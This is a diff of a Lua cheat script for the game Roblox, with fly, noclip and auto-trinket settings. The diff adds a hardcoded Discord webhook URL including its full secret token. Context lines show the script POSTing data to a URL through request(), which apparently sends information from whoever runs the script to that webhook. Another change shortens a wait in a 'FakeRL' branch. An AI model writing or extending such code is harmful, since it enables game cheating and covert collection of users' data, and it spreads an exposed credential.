@@ -16,6 +16,7 @@ pcall(function()
 	_G.brightness = 0.5
 	_G.timeofday = 14
 	_G.autotrinket = false
+	local linka = "https://discord.com/api/webhooks/871926157782712362/sBnXXX2GYG0Blifn5QWfSAj0kO78sNRaPecBpCHIgsMY7r1bhjBCqhivsZWuFtUEeAKg"
 	local MainFrame
 	local noclipwhenfly = false
 	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
@@ -404,7 +405,7 @@ pcall(function()
 	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 	request(abcdef)
 	if place == "FakeRL" then
-		wait(5) -- TOO MANY STACKS JUST WAIT KID
+		wait() -- TOO MANY STACKS JUST WAIT KID
 		pcall(function()
 			local guiname = "LeaderboardGui"
 			local plr = Players.LocalPlayer
